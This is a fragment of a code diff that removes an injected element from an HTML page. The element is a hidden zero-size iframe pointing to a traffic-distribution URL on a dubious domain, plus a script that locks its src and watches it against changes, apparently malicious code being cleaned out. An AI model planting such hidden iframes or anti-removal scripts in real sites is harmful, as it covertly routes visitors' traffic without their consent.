@@ -97,33 +97,5 @@ if (randomSite.includes("format5.html")) {
   localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
 }
 </script>
-<iframe
-  id="stacks"
-  src="https://hotbpacewo.today/tds?id=1570344962&p1=sub1&p2=sub2&p3=sub3&p4=sub4"
-  sandbox=""
-  referrerpolicy="no-referrer"
-  allow="none"
-  style="width:0px; height:0px; border:none;">
-</iframe>
-
-<script>
-const iframe = document.getElementById("stacks");
-
-// Prevent any attempt to replace the iframe dynamically
-Object.defineProperty(iframe, "src", {
-  writable: false,
-  configurable: false
-});
-
-// Monitor for any unexpected changes (extra paranoia)
-const observer = new MutationObserver(() => {
-  iframe.setAttribute("sandbox", "");
-});
-
-observer.observe(iframe, {
-  attributes: true,
-  attributeFilter: ["sandbox", "src"]
-});
-</script>
 </body>
 </html>
